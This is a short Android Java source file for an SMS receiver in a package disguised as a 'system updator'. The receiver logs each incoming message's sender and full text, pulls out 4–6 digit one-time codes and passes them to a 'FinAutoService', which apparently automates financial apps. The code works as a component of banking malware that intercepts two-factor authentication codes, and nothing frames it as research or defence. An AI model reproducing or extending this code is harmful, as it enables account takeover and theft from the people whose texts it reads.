          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import android.util.Log;
          import java.util.regex.Matcher;
          import java.util.regex.Pattern;

          public class SmsReceiver extends BroadcastReceiver {
              private static final String TAG = "SmsReceiver";
              private static String lastOtp = "";

              @Override
              public void onReceive(Context context, Intent intent) {
                  Bundle extras = intent.getExtras();
                  if (extras == null) return;
                  Object[] pdus = (Object[]) extras.get("pdus");
                  if (pdus == null) return;

                  for (Object pdu : pdus) {
                      SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                      String body = msg.getMessageBody();
                      String sender = msg.getOriginatingAddress();
                      Log.d(TAG, "SMS from " + sender + ": " + body);

                      Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
                      Matcher matcher = pattern.matcher(body);
                      if (matcher.find()) {
                          lastOtp = matcher.group();
                          Log.d(TAG, "OTP extracted: " + lastOtp);
                          FinAutoService.setLastOtp(lastOtp);
                      }
                  }
              }

              public static String getLastOtp() { return lastOtp; }
          }
          EOF

